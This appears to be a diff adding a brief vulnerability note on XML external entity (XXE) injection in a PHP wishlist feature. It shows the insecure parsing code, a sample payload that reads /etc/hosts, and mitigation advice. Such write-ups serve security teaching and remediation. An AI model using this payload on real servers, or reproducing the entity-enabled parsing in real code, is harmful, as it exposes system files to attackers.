@@ -1,0 +1,23 @@
+
+libxml_disable_entity_loader(false);
+$wishlist = simplexml_load_string($xml_data, "SimpleXMLElement", LIBXML_NOENT);
+
+When the XML is processed by simplexml_load_string with the LIBXML_NOENT option, the web 
+app resolves external entities, allowing attackers access to sensitive files or allowing 
+them to make unintended requests from the server.
+
+PAYLOAD:
+  <!--?xml version="1.0" ?-->
+  <!DOCTYPE foo [<!ENTITY payload SYSTEM "/etc/hosts"> ]>
+  <wishlist>
+    <user_id>1</user_id>
+      <item>
+        <product_id>&payload;</product_id>
+      </item>
+  </wishlist>
+
+MITIGATION:
+  Disable External Entity Loading -> Change to
+    libxml_disable_entity_loader(true);
+
+  Validate and Sanitise User Input -> Validate and sanitize received XML, scan for unusual strings
